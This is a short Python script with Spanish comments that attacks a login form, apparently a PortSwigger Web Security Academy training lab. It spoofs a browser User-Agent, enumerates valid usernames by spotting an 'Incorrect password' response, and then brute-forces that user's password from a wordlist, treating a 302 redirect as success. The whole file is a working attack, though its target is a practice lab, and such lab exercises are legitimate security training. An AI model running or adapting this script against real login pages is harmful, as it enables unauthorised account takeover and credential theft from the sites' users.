# Bruteforcing_Alexander

import requests

# URL Objetivo

TARGET_URL = "https://0aa400ba0481262480ec7100003d0006.web-security-academy.net/login"


# Archivos de usuarios y contraseñas

USER_FILE = "usuarios_noborrar.txt"
PASSWORD_FILE = "passwords_db.txt"

# El servidor pensara que la petición viene de un navegador

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Cargar usuarios

def load_users():
    with open(USER_FILE, "r", encoding="utf-8") as file:
        return [line.strip() for line in file if line.strip()]

# Cargar contraseñas

def load_passwords():
    with open(PASSWORD_FILE, "r", encoding="utf-8") as file:
        return [line.strip() for line in file if line.strip()]

# Enumerar usuarios
def enumerate_users(usernames):
    valid_user = None
    for user in usernames:
        data = {"username": user, "password": "wrongpassword"}  # Usamos un password incorrecto a propósito
        response = requests.post(TARGET_URL, headers=HEADERS, data=data, allow_redirects=False)
        
        # Identificamos la diferencia en la respuesta, para hallar el usuario correcto

        if "Incorrect password" in response.text:  
            print(f"[+] Usuario válido encontrado: {user}")
            valid_user = user
            break

    if not valid_user:
        print("[-] No se encontraron usuarios válidos.")
    return valid_user

# Ataque de fuerza bruta a la contraseña
def brute_force_password(username, passwords):
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(TARGET_URL, headers=HEADERS, data=data, allow_redirects=False)

        # Si la respuesta es 302, significa que el login fue exitoso

        if response.status_code == 302:
            print(f"[+] Credenciales válidas encontradas: {username}:{password}")
            return password

    print("[-] No se encontró una contraseña válida.")
    return None

# Ejecutar el ataque

if __name__ == "__main__":
    users = load_users()
    passwords = load_passwords()

    user = enumerate_users(users)
    if user:
        brute_force_password(user, passwords)



input("Presiona Enter...")
